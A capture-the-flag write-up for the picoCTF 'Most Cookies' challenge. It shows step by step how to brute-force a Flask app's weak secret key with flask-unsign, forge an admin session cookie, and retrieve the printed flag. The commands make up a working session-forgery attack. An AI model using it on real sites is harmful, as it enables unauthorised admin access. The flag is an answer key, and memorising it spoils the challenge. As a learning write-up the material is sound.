Most Cookies
===
Challenge Details
---
![picoCtf_Most_cookies](https://user-images.githubusercontent.com/96666980/196559439-90168289-f9fc-4154-8969-1f7f11a4b7ce.png)

---
##### <a href="https://play.picoctf.org/practice/challenge/177?category=1&page=2">link to the challenge</a>
---
Solution
---  

after analyzing the[`server.py`](https://github.com/Wise-Cpt/CTF-Writeups/blob/main/Web/picoCTF-Most%20Cookies/server.py)  file. I found these two pieces of code very useful
```
def search():
	if "name" in request.form and request.form["name"] in cookie_names:
		resp = make_response(redirect("/display"))
		session["very_auth"] = request.form["name"]
		return resp
	else:
		message = "That doesn't appear to be a valid cookie."
		category = "danger"![picoCtf_Most_cookies](https://user-images.githubusercontent.com/96666980/196553894-69cbe908-0420-4175-92a4-aea8a2f8a676.png)

		flash(message, category)![picoCtf_Most_cookies](https://user-images.githubusercontent.com/96666980/196553873-cee0e4ba-adbe-48c9-8deb-e16a8b0cbfef.png)

		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp
```

```
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

```  
-The first one is about the secret key 
-The second one is about the flag

So in order to get the secret key it's clear that we can find it in the list 'cookie_names' in [`server.py`](https://github.com/Wise-Cpt/CTF-Writeups/blob/main/Web/picoCTF-Most%20Cookies/server.py). We can put the words in wordlist to use it later to brute force the secret key.
lets call the python script with `script.py` and the wordlist with `wordlist.txt`
```
words = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

print('\n'.join(words))
```
```
$ python3 script.py > wordlist.txt
```
Well, now we back to the second piece of code we see that if the check == "admin" in the session we get the flag.

lets get the session value from the website (click on inspect then Application>Cookies>session), and decode it with `flask-unsign`
```
$ flask-unsign --decode --cookie "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Y05xZQ._dy1eNGOeXsDZmGMww0lIHb_GFY"
```
output will be like this
```
{'very_auth': 'blank'}
```
now it's time to use the wordlist to get the secret key

```
$ flask-unsign --unsign --wordlist cookie_wordlist.txt --server "http://mercury.picoctf.net:65344/"
```
and we get the secret key which is 'fortune'

now lets change the value of 'very_auth' from 'blank to 'admin' 

```
$ flask-unsign --sign --secret 'fortune' --cookie "{'very_auth': 'admin'}"
```
output will be like this
```
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Y09BCg.gyB58CCB-vkh54EuAzrRhDWc7iA
```
now just change the session value of the wbsite with this last one and reload the page you'll get the flag.
#### Flag:
 `picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}`


